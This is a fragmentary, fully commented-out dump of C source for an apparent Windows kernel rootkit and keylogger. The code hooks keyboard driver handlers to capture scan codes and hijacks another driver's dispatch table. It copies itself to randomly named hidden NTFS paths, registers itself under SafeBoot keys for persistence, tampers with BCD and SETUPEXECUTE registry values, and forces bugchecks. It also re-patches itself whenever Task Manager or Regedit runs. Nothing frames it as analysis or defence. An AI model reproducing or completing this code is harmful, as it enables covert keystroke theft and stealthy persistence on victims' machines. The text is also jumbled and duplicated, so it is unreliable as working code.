//		//}
//		//if (TRUE == mystrcmp(L"svchost.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END)){
//		//	break;
//		//}
//		//if (TRUE == mystrcmp(L"csrss.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END)){
//		//	break;					
//		//}
//		//flag = mystrcmp(L"ssmss.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END) ||
//		//	mystrcmp(L"winlogon.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END) ||
//		//	mystrcmp(L"cssrss.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END);
//		//if (TRUE == flag){
//		//	break;
//		//}
//		//HANDLE hProcess = NULL;
//		//OBJECT_ATTRIBUTES objectAttriboutes;
//		//CLIENT_ID cid;
//		//cid.UniqueThread = 0;
//		//cid.UniqueProcess = (HANDLE)i;
//		//InitializeObjectAttributes(&objectAttriboutes, NULL, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//		//if (TRUE == mystrcmp(L"notepad.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END)){
//		
//		if (TRUE == mystrcmp(L"svchost.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END)){
//			HANDLE hProcess;
//			ObOpenObjectByPointer(pEprocess, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, GENERIC_ALL, NULL, KernelMode, &hProcess);
//			
//			//ObOpenObjectByPointer
//			//KIRQL oldIrql;
//			//KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//			//KeStallExecutionProcessor(1000000);
//			//KeLowerIrql(oldIrql);
//			//DbgPrint("zuibzvzrzrrvzrzizvuiizvizrzreivzri");
//			//ntStatus = ZwOpenProcess(&hProcess, SYNCHRONIZE, &objectAttriboutes, &cid);
//			//if (NT_SUCCESS(ntStatus)){
//			//	DbgPrint("zuibzvzrzrrvzrzizvuiizvizrzreivzri");
//			//KeWaitForMultipleObjects
//			KeWaitForSingleObject(pEprocess, Executive, KernelMode, FALSE, NULL);
//			HANDLE hKey;
//			OBJECT_ATTRIBUTES objectAttributes;
//			UNICODE_STRING uKeyName;
//			NTSTATUS status1, status2, status3;
//			RtlInitUnicodeString(&uKeyName, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Session Manager");
//			InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//				//if (FALSE == flag){
//					//for (int i = 0; i < 10; i++){
//		
//			status1 = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szRegPath4, L"SETUPEXECUTE", REG_MULTI_SZ, (PVOID)szBootPath, sizeof(szBootPath));
//			status2 = ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//			status3 = ZwFlushKey(hKey);
//			KeBugCheckEx(status1, status2, status3, 0x0, 0x0);
//					//DbgPrint("KeBugCheckEx(status1, status2, status3, 0x0, 0x0); %lX, %lX, %lX", status1, status2, status3);
//					//}
//				//}
//		//	}
//			//flag = TRUE;
//			//break;
//		}
//	}


//}
//DbgPrint("iteration complete");
////HANDLE hKey;
////OBJECT_ATTRIBUTES objectAttributes;
////UNICODE_STRING uKeyName;
////NTSTATUS status1, status2, status3;
////RtlInitUnicodeString(&uKeyName, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Session Manager");
////	InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_KERNEL_HANDLE, NULL, NULL);
////if (FALSE == flag){
////	//for (int i = 0; i < 10; i++){
////	KeWaitForSingleObject
////		status1 = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szRegPath4, L"SETUPEXECUTE", REG_MULTI_SZ, (PVOID)szBootPath, sizeof(szBootPath));
////		status2 = ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
////		status3 = ZwFlushKey(hKey);
////		KeBugCheckEx(status1, status2, status3, 0x0, 0x0);
////	//}
////}
//////PsLookupProcessByProcessId()
//	//SeLocateProcessImageName
////__nop();
//DbgPrint("trying to open alpc port");
//DbgPrint("Alpc Port found.");
//DbgPrint("%lX", ntStatus);
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szRegPath4, L"SETUBEXECUTE", REG_MULTI_SZ, (PVOID)szBootPath, sizeof(szBootPath));
//KeBugCheckEx(status1, status2, status3, 0x0, 0x0);
//PsTerminateSystemThread(0x0);

//extern POBJECT_TYPE* LpcPortObjectType;





//OBJECT_ATTRIBUTES objectAttributes;
//HANDLE hDrvImage;
//UNICODE_STRING uDrvImagePath;
//IO_STATUS_BLOCK ioStatusBlock;
//RtlInitUnicodeString(&uDrvImagePath, L"\\??\\Global\\C:\\Windows\\System32\\Drivers\\PpayLoad.sys");
//InitializeObjectAttributes(&objectAttributes, &uDrvImagePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//NTSTATUS ntStatus = ZwCreateFile(&hDrvImage, FILE_APPEND_DATA, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
//DbgPrint("ZwCreateFile: 0x%lX", ntStatus);
//ZwClose(hDrvImage);
//PrepOnBoot(NULL);
//__writecr8(CLOCK_LEVEL);
//PKSTART_ROUTINE fpPrepOnBoot = (PKSTART_ROUTINE)((PULONGLONG)pStartContext)[0];
//PKSTART_ROUTINE fpPrepOnShutdown = (PKSTART_ROUTINE)((PULONGLONG)pStartContext)[1];
//fpPrepOnBoot(NULL);
//PrepOnBoot(NULL);
//fpPrepOnShutdown(NULL);
//fpPrepOnBoot(NULL);
//PrepOnBoot(NULL);
//fpPrepOnShutdown(NULL);
//HANDLE hKeyToFlush;
//UNICODE_STRING uDrvRegPath;
//OBJECT_ATTRIBUTES objectAttributes;
//NTSTATUS ntStatus;
//UNICODE_STRING uHookDrvName;
//PDRIVER_OBJECT pHookDrvObj;
////RtlInitUnicodeString(&uHookDrvName, L"\\Driver\\kEvP64");
//RtlInitUnicodeString(&uKeyName, L"BCD000NULL0");
//RtlInitUnicodeString(&uFileName, L"\\Device\\HarddiskVolume1\\Boot\\BCD");
//RtlInitUnicodeString(&uRootKeyName, L"\\Registry\\Machine");
//InitializeObjectAttributes(&rootObjectAttributes, &uRootKeyName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

//InitializeObjectAttributes(&objectAttributes2, &uFileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//
////RtlInitUnicodeString(&uDrvRegPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services");
////InitializeObjectAttributes(&objectAttributes, &uDrvRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
////ZwOpenKey(&hKeyToFlush, GENERIC_ALL, &objectAttributes);
//DbgPrint("ZwOpenKey: 0x%lX", ZwOpenKey(&hRootKey, GENERIC_ALL, &rootObjectAttributes));
//WCHAR szTestStr[] = L"\\Registry\\Machine\\BCD00000000\\Objects\\{64cb4de7-929a-11e3-964f-df1fa29b644a}\\Elements\\16000049";
//UCHAR value = 0x01;
//
//InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, hRootKey, NULL);
//DbgPrint("ZwLoadKey: 0x%lX", ZwLoadKey(&objectAttributes, &objectAttributes2));

//DbgPrint("%lX", RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szTestStr, L"Element", REG_BINARY, &value, sizeof(UCHAR)));
//
//ntStatus = ObReferenceObjectByName(&uHookDrvName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, &pHookDrvObj);
//if (NT_SUCCESS(ntStatus)){
//	KIRQL oldIrql;
//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	pHookDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = pHookDrvObj->MajorFunction[IRP_MJ_INTERNAL_DEVICE_CONTROL];
//	KeLowerIrql(oldIrql);
//}
//else {
//	DbgPrint("Couldn open powertool driver");
//}
//DbgPrint("ZwFlushKey: 0x%lX", ZwFlushKey(hKeyToFlush));
//DbgPrint("0x%lX", ntStatus);
//UNICODE_STRING     uniName;
//OBJECT_ATTRIBUTES  objAttr;
//RtlInitUnicodeString(&uniName, L"\\DosDevices\\C:\\Windows\\System32\\Drivers\\drvtrics.sys");  // or L"\\SystemRoot\\example.txt"
//InitializeObjectAttributes(&objAttr, &uniName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

//HANDLE   handle;
////NTSTATUS ntstatus;
//IO_STATUS_BLOCK    ioStatusBlock;

//LARGE_INTEGER      byteOffset;

//g_pDriverImage->DrvImageBegin = ExAllocatePool()
//DbgPrint("0x%lX", ntStatus);
//PMINIMAL_IMAGE_INFO pDrvImageInfo = (PMINIMAL_IMAGE_INFO)pParameter;
//WCHAR szDrvFilePath[] = L"\\??\\C:\\PayLoad.sys";
//WCHAR szDrvFilePath[] = L"system32\\Drivers\\PayLoad.sys";
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szDrvRegPath, L"ImagePath", REG_SZ, szDrvFilePath, sizeof(szDrvFilePath));

//DbgPrint("0x%lX", ntStatus);
//__writecr8(CLOCK_LEVEL);



//KzRaiseIrql

//pDrvImageInfo->DrvImageSize = 0x1234;
//#define  BUFFER_SIZE 30
//CHAR     buffer[BUFFER_SIZE];
//DbgPrint("g_pDriverImage = 0x%llX", g_pDriverImage);
//if (NULL != g_pDriverImage){
//	DbgPrint("DrvImageBegin = 0x%llX, DrvImageSize = %d", g_pDriverImage->DrvImageBegin, g_pDriverImage->DrvImageSize);
//}
//PUCHAR buffer = g_pNewMemoryNonexec;
//ULONG fileSize = (ULONG)g_DriverSize;
//size_t  cb = (ULONGLONG)g_DriverSize;
//ntstatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "This is %d test\r\n", 0x0);
//if (NT_SUCCESS(ntstatus)) {
//ntstatus = RtlStringCbLengthA(buffer, sizeof(buffer), &cb);
//if (NT_SUCCESS(ntstatus)) {
//	//}
//}


//
//// Do not try to perform any file operations at higher IRQL levels.
//// Instead, you may use a work item or a system worker thread to perform file operations.
//
//if (KeGetCurrentIrql() != PASSIVE_LEVEL)
//return STATUS_INVALID_DEVICE_STATE;
//

//ntstatus = ZwCreateFile(&handle,
//	GENERIC_WRITE,
//	&objAttr, &ioStatusBlock, NULL,
//	FILE_ATTRIBUTE_NORMAL,
//	0,
//	FILE_OVERWRITE_IF,
//	FILE_SYNCHRONOUS_IO_NONALERT,
//	NULL, 0);
//
//
//
//
//#define  BUFFER_SIZE 30
//CHAR     buffer[BUFFER_SIZE];
//size_t  cb;
//
//if (NT_SUCCESS(ntstatus)) {
//	ntstatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "This is %d test\r\n", 0x0);
//	if (NT_SUCCESS(ntstatus)) {
//		ntstatus = RtlStringCbLengthA(buffer, sizeof(buffer), &cb);
//		if (NT_SUCCESS(ntstatus)) {
//			ntstatus = ZwWriteFile(handle, NULL, NULL, NULL, &ioStatusBlock,
//				buffer, cb, NULL, NULL);
//		}
//	}
//	ZwClose(handle);
//}
//Im folgenden Codebeispiel wird veranschaulicht, wie aus einer Datei gelesen.
//
//LARGE_INTEGER      byteOffset;
//
//ntstatus = ZwCreateFile(&handle,
//	GENERIC_READ,
//	&objAttr, &ioStatusBlock,
//	NULL,
//	FILE_ATTRIBUTE_NORMAL,
//	0,
//	FILE_OPEN,
//	FILE_SYNCHRONOUS_IO_NONALERT,
//	NULL, 0);
//if (NT_SUCCESS(ntstatus)) {
//	byteOffset.LowPart = byteOffset.HighPart = 0;
//	ntstatus = ZwReadFile(handle, NULL, NULL, NULL, &ioStatusBlock,
//		buffer, BUFFER_SIZE, &byteOffset, NULL);
//	if (NT_SUCCESS(ntstatus)) {
//		buffer[BUFFER_SIZE - 1] = '\0';
//		DbgPrint("%s\n", buffer);
//	}
//	ZwClose(handle);
//}
//PDRIVER_IMAGE g_pDriverImage;
//PDRIVER_IMAGE g_pDriverImage;
//PMY_DRIVER_OBJECT g_pMyDriverObject;
//PUCHAR g_pNewMemoryNonexec;
//PUCHAR g_DriverSize;
//PDRIVER_OBJECT g_pDriverObject;

//UNREFERENCED_PARAMETER(hRootKey);
//UNREFERENCED_PARAMETER(objectAttributes);
//UNREFERENCED_PARAMETER(uFileName);
//UNREFERENCED_PARAMETER(uKeyName);
//UNREFERENCED_PARAMETER(uRootKeyName);
//UNREFERENCED_PARAMETER(rootObjectAttributes);
//UNREFERENCED_PARAMETER(objectAttributes2);

//OBJECT_ATTRIBUTES rootObjectAttributes, objectAttributes, objectAttributes2;
//UNICODE_STRING uRootKeyName, uKeyName, uFileName;
//HANDLE hRootKey;

//ULONG g_DriverSize;
//PUCHAR pFullDriverImageBegin = NULL;
//PUCHAR pNewMemoryNonexec = NULL;
//pNewMemoryNonexec = ExAllocatePool(NonPagedPool, pDriverObject->DriverSize);
//g_pDriverImageInfo = ExAllocatePool(NonPagedPool, sizeof(PMINIMAL_IMAGE_INFO));
//g_pDriverImageInfo->DrvImageSize = byteOffset.LowPart;
//buffer[BUFFER_SIZE - 1] = '\0';
//KeBugCheckEx(pDriverImageInfo->DrvImageSize, (ULONG_PTR)pDriverImageInfo->DrvImageBegin, 0x0, 0x0, 0x0);
//pFullDriverImageBegin = (PUCHAR)pDriverObject->DriverStart;
//for (ULONG i = 0; i < pDriverObject->DriverSize; i++){
//	pNewMemoryNonexec[i] = pFullDriverImageBegin[i];
//}
//g_DriverSize = (PUCHAR)pDriverObject->DriverSize;
//g_pDriverImage->DrvImageBegin = pNewMemoryNonexec;
//g_pDriverImage->DrvImageSize = pDriverObject->DriverSize;

//LARGE_INTEGER interval2;
//interval2.QuadPart = -1200000000;
//KeDelayExecutionThread(KernelMode, FALSE, &interval2);

//NTSTATUS ntstatus = ((PDRIVER_DISPATCH)((PULONGLONG)pDeviceObject->DriverObject->DriverStartIo)[0])(pDeviceObject, pIrp);
//	NTSTATUS ntStatus = STATUS_NO_SUCH_FILE;
//	DbgPrint("bleh.");
//	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(pIrp);
//	if (NULL != irpStack){
//		PFILE_OBJECT pFileObject = irpStack->FileObject;
//		if (NULL != pFileObject){
//			DbgPrint("%wZ", pFileObject->FileName);
//			if (mystrcmp(L".bin", pFileObject->FileName.Buffer, pFileObject->FileName.Length, METHOD_END)){
//				pIrp->IoStatus.Status = 0xC0000001 + pFileObject->FileName.Length;
//				pIrp->IoStatus.Status = 0xC0000156;
//				return pIrp->IoStatus.Status;
//			}
//		}
//	}
//#pragma warning(disable:4054)	//We are suspected of trying to alter functions
//	ntStatus = ((PDRIVER_DISPATCH)pDeviceObject->DriverObject->DriverStartIo)(pDeviceObject, pIrp);
//	
//	PFILE_OBJECT pFileObject = IoGetCurrentIrpStackLocation(Irp)->FileObject;

//#define SAFEBOOT_KEY_LENGTH 108

//IoSetCompletionRoutine(pIrp, g_pKbdHookInfo->fpHookCompletionRoutine, NULL, TRUE, TRUE, TRUE);
//UNREFERENCED_PARAMETER(pDeviceObject);
//UNREFERENCED_PARAMETER(pIrp);
//UNREFERENCED_PARAMETER(pContext);
//PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(pIrp);
//PIO_COMPLETION_ROUTINE p_compRoutine;
//p_compRoutine = oldCompRoutine;
//PSCSI_REQUEST_BLOCK pSrb = NULL;
//ULONG bleh;
//ULONGLONG bleeh;
////UCHAR cdbLength = 0;
////SCSI_SENSE_DESCRIPTOR_BLOCK_COMMAND wddwq;
//if (NULL != irpStack){
//	pSrb = irpStack->Parameters.Scsi.Srb;
//	DbgPrint("%u, %llX, %llX", irpStack->Parameters.DeviceIoControl.OutputBufferLength, pIrp->AssociatedIrp.SystemBuffer, pIrp->MdlAddress);
//	DbgPrint("%llX", pIrp->UserBuffer);
//	if (NULL != pSrb){
//		try {
//			bleh = pSrb->DataTransferLength;
//			bleeh = (ULONGLONG)pSrb->DataBuffer;//Throws 0xC0000005 if pointer points to unreadable kernel memory (leads to bug check without SEH)
//		} except(EXCEPTION_EXECUTE_HANDLER) {
//			DbgPrint("An attempt was made to dereference an invalid pointer pointing to %llX!", pSrb);
//			goto Ende;
//			//return (OldDispatchFunctions[IRP_MJ_INTERNAL_DEVICE_CONTROL])(pDeviceObject, pIrp);
//		}
//		//return (OldDispatchFunctions[IRP_MJ_INTERNAL_DEVICE_CONTROL])(pDeviceObject, pIrp);
//		DbgPrint("DataTransferLength: %u, DataBuffer @ %llX", bleh, bleeh);
//	}
//}

//if (TRUE == flag){
//	dispVar1 = SMILEY_CHAR1;
//	dispVar2 = SMILEY_CHAR2;
//}
//else {
//	dispVar1 = SMILEY_CHAR2;
//	dispVar2 = SMILEY_CHAR1;
//}
//PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(pIrp);

//interval.QuadPart = -2000000;
//RtlStringCbPrintfW(pszDrvFilePath, sizeof(pszDrvFilePath), L"\\??\\Global\\C:\\$%ws", pRandDrvName);
//WCHAR pRandDrvName[11];
//DbgPrint("ZwWriteFile: 0x%lX", ntstatus);
//RtlInitUnicodeString(&uDrvFilePath, g_pRunTimeInfo->DrvRandPath);
//ObfDereferenceObject(pEprocess);
//else if ((TRUE == mystrcmp(L"utilman.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END))||
//	(TRUE == mystrcmp(L"taskmgr.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END))||
//	(TRUE == mystrcmp(L"regedit.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END))){
//	//if (0x0 == g_pRunTimeInfo->IsPatched){
//	//	KIRQL oldIrql;
//	//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	//	g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
//	//	pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
//	//	KeLowerIrql(oldIrql);
//	//	g_pRunTimeInfo->IsPatched = 0xFFFFFFFF;
//	//}
//	PrepOnBoot(NULL);
//	ntstatus = KeWaitForSingleObject(pEprocess, Executive, KernelMode, FALSE, NULL);
//	//ObfDereferenceObject(pEprocess);
//	DbgPrint("0x%llX not there anymore, or other problem (0x%lX)!", pEprocess, ntstatus);
//	PrepOnShutdown(NULL);
//	break;
//}
//ObfDereferenceObject(pEprocess);
//RtlStringCbCatW(szDrvRegPathEnum)
//DbgPrint("szOldRegName: %ws", szOldRegName);
//L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\oldkeyname";
//DbgPrint("deleting safebootminimalold: %ws", szSafebootRegPathMinimalOld);

//L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\oldkeyname";
//DbgPrint("deleting safebootntworkold: %ws", szSafebootRegPathNetworkOld);

//DbgPrint("deleting safebootminimal: %ws", szSafebootRegPathMinimal);
//DbgPrint("deleting safebootntwork: %ws", szSafebootRegPathMinimal);



//WCHAR szDrvRegPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\drvtriks";
//WCHAR szDrvRegPath2[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\drvtriks\\Enum";
//WCHAR szSafebootRegPathMinimal[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\drvtriks.sys";
//WCHAR szSafebootRegPathNetwork[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\drvtriks.sys";

//L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\oldkeyname.sys";
//RtlStringCbCatNExW


//RtlInitUnicodeString(&uDrvRegPath, szDrvRegPath2);
//InitializeObjectAttributes(&objectAttributes, &uDrvRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, DELETE, &objectAttributes);
//ZwDeleteKey(hKey);
//ZwClose(hKey);
//g_pRunTimeInfo->DrvRandName
//InitializeObjectAttributes(&objectAttributes, &uDrvRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//DbgPrint("randreg: %wZ", uDrvRegPath);
//DbgPrint("oldregenum: %wZ", uDrvRegPathEnum);
//DbgPrint("oldreg: %wZ", *(g_pRunTimeInfo->OldRegPath));
//g_pRunTimeInfo->
//RtlInitUnicodeString(&uDrvRegPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services");
//InitializeObjectAttributes(&objectAttributes, &uDrvRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, GENERIC_ALL, &objectAttributes);
//ZwFlushKey(hKey);

//RtlInitUnicodeString(&uDrvFilePath, L"\\SystemRoot\\System32\\Drivers\\drvtriks.sys");
//InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//DbgPrint("randfile: %wZ", uDrvFilePath);
//DbgPrint("oldfile: %wZ", *(g_pRunTimeInfo->OldDrvPath));
//KeBugCheck(ZwDeleteFile(&objectAttributes));
//ULONG drvType = SERVICE_KERNEL_DRIVER;
//WCHAR szDrvRegPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\drvtriks";
//WCHAR szSafebootRegPathMinimal[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\drvtriks.sys";
//WCHAR szSafebootRegPathNetwork[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\drvtriks.sys";
//WCHAR szSafebootData[] = L"Driver";

//ULONG seed = (ULONG)&pDriverTextBegin;
//CreateRandName(g_pRunTimeInfo->DrvRandName, sizeof(g_pRunTimeInfo->DrvRandName) / sizeof(WCHAR));
//RtlStringCbPrintfW(g_pRunTimeInfo->DrvRandPath, sizeof(g_pRunTimeInfo->DrvRandPath), L"\\??\\C:\\$%ws", szString);
//RtlStringCbLengthW(g_pRunTimeInfo->DrvRandPath, sizeof(g_pRunTimeInfo->DrvRandPath), (PULONGLONG)&g_pRunTimeInfo->DrvRandPathLength);
//g_pRunTimeInfo->DrvRandPathLength += sizeof(WCHAR);
//g_pRunTimeInfo->ValueType = RtlRandomEx(&seed);
//DbgPrint("keyname: %ws", g_pRunTimeInfo->KeyRandName);
//DbgPrint("szDrvRegPath=%ws", szDrvRegPath);
//RtlInitUnicodeString(&uDrvRegPath, szDrvRegPath);

//DbgPrint("uDrvRegPath = %wZ, file: %ws", uDrvRegPath, g_pRunTimeInfo->DrvRandPath);
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szDrvRegPath, L"Type", (g_pRunTimeInfo->ValueType) ^ 0x7F7F7F7F, NULL, 0);
////WCHAR pKeyRandName[9];
//WCHAR pszDrvFilePath[MAXCHAR];
//DbgPrint("g_DriverSize = 0x%llX, buffer = 0x%llX", g_pDriverImageInfo->DrvImageSize, g_pDriverImageInfo->DrvImageBegin);
//ZwClose(hDrvFile);
//#define TOUPPER_DELTA ('a'-'A');
//UNREFERENCED_PARAMETER(length);
//WCHAR pszDrvFilePath[MAXCHAR];


//RtlInitUnicodeString(&uDrvFilePath, L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$SystemRoot\\System32\\Drivers\\drvtriks.sys");
//RtlInitUnicodeString(&uDrvFilePath, pszDrvFilePath);
//interval2.QuadPart = -10000000;

//KeDelayExecutionThread(KernelMode, FALSE, &interval2);
//(TRUE == mystrcmp(L"dwm.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END))*/	//Initialize the linked list that will serve as a queue to hold the captured keyboard scan codes 
//Initialize the lock for the linked list queue   
//Initialize the work queue semaphore  ){

//Also 
//RtlCopyUnicodeString
//DbgPrint("Attempting to start SenseThread");
//UNICODE_STRING uDrvFilePath;
//WCHAR szString[10];
/////Creating random path parts in order to later generate both a new driver and registry path
/////Also generate a random unique value type for storing the driver image path in the registry
////CreateRandName(g_pRunTimeInfo->DrvRandName, sizeof(g_pRunTimeInfo->DrvRandName) / sizeof(WCHAR));
//CreateRandName(g_pRunTimeInfo->DrvRandName, g_pRunTimeInfo->DrvRandNameLength / sizeof(WCHAR));
//CreateRandName(g_pRunTimeInfo->KeyRandName, g_pRunTimeInfo->KeyRandNameLength / sizeof(WCHAR));
////RtlStringCbPrintfW(g_pRunTimeInfo->DrvRandPath, sizeof(g_pRunTimeInfo->DrvRandPath), L"\\??\\C:\\$%ws", szString);
////RtlStringCbLengthW(g_pRunTimeInfo->DrvRandPath, sizeof(g_pRunTimeInfo->DrvRandPath), (PULONGLONG)&g_pRunTimeInfo->DrvRandPathLength);
////g_pRunTimeInfo->DrvRandPathLength += sizeof(WCHAR);
//DbgPrint("Removing and storing driver info");
//DbgPrint("%wZ", *pModuleTableFullNameEntry);
//DbgPrint("FATAL ERROR!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! maybe os unsupported.");
//DbgPrint("Drv %wZ", *(g_pRunTimeInfo->OldDrvPath));
//DbgPrint("Reg %wZ", *(g_pRunTimeInfo->OldRegPath));

//RtlInitUnicodeString(&uDrvFilePath, L"\\SystemRoot\\System32\\Drivers\\drvtriks.sys");
//DbgPrint("Driver file size: %d", g_pRunTimeInfo->DrvImageSize);
//DbgPrint("Driver file content @ 0x%llX", g_pRunTimeInfo->DrvImageBegin);
//KeStallExecutionProcessor(5000000);
//DbgPrint("%wZ", *pModuleTableBaseNameEntry);
//DbgPrint("Attempted to start SenseThread");

//DbgPrint("Attempting to start WorkerThread");
//DbgPrint("Attempted to start WorkerThread");

////WCHAR pKeyRandName[9];
//WCHAR pszDrvFilePath[MAXCHAR];


//RtlStringCbPrintfW(pszDrvFilePath, sizeof(pszDrvFilePath), L"\\??\\Global\\C:\\$%ws", g_pRunTimeInfo->DrvRandName);
//RtlInitUnicodeString(&uDrvFilePath, pszDrvFilePath);
//
//InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

//ntstatus = ZwCreateFile(&hDrvFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);

//if (NT_SUCCESS(ntstatus)) {
//	//DbgPrint("g_DriverSize = 0x%llX, buffer = 0x%llX", g_pDriverImageInfo->DrvImageSize, g_pDriverImageInfo->DrvImageBegin);
//	ntstatus = ZwWriteFile(hDrvFile, NULL, NULL, NULL, &ioStatusBlock, g_pRunTimeInfo->DrvImageBegin, g_pRunTimeInfo->DrvImageSize, NULL, NULL);
//	//DbgPrint("ZwWriteFile: 0x%lX", ntstatus);
//	ZwClose(hDrvFile);
//}
//else{
//	DbgPrint("%lX", ntstatus);
//}

//int                       numKeys, i, Irp;
//PIRP Irp = NULL;
//    IrpSp = IoGetCurrentIrpStackLocation(Irp);
//     if (NT_SUCCESS(Irp->IoStatus.Status)) {
//         KeyData = Irp->AssociatedIrp.SystemBuffer;
//       numKeys = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
//   for (i = 0; i < numKeys; i++) {
//            DbgPrint(("ScanCode: %x ", KeyData[i].MakeCode));
//          DbgPrint(("%s\n", KeyData[i].Flags ? "Up" : "Down"));
//             if (KeyData[i].MakeCode == CAPS_LOCK) {
//             KeyData[i].MakeCode = LCONTROL;
//		}
//	}
//	424
//}


//PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
//PDEVICE_OBJECT pKeyboardDeviceOjbect = pKeyboardDeviceExtension->pKeyboardDevice;   
//IO_STATUS_BLOCK io_status;
//NTSTATUS thestatus;
//PLIST_ENTRY pListEntry;
//char buf[2] = { 0 };
//LARGE_INTEGER byteOffset;
//byteOffset.QuadPart = 0;
//KEY_DATA* kData; //custom data structure used to hold scancodes in the linked list
///*do{
//thestatus = ZwReadFile(pKeyboardDeviceExtension->hLogFile,NULL,NULL,NULL,&io_status,&buf,1,&byteOffset,NULL);
//if(thestatus == STATUS_SUCCESS){
//byteOffset.QuadPart++;
//}else{
//buf[0] = '\0';
//}
//}while(buf[0]!=0);*/
////DbgPrint("byteoffset %i", byteOffset.QuadPart);
//
////Enter the main processing loop... This is where we will process the scancodes sent   
////to us by the completion routine.   
//while (true)
//{
//	// Wait for data to become available in the queue    
//	//KeWaitForSingleObject(&pKeyboardDeviceExtension->semQueue, Executive, KernelMode, FALSE, NULL);
//
//	pListEntry = ExInterlockedRemoveHeadList(&pKeyboardDeviceExtension->QueueListHead,
//		&pKeyboardDeviceExtension->lockQueue);
//
//	//////////////////////////////////////////////////////////////////////   
//	// NOTE: Kernel system threads must terminate themselves. They cannot   
//	// be terminated from outside the thread. If the driver is being    
//	// unloaded, therefore the thread must terminate itself. To do this   
//	// we use a global variable stored in the Device Extension.    
//	// When the unload routine wishes to termiate, it will set this    
//	// flag equal to true and then block on the thread object. When   
//	// the thread checks this variable and terminates itself, the   
//	// Unload routine will be unblocked and able to continue its    
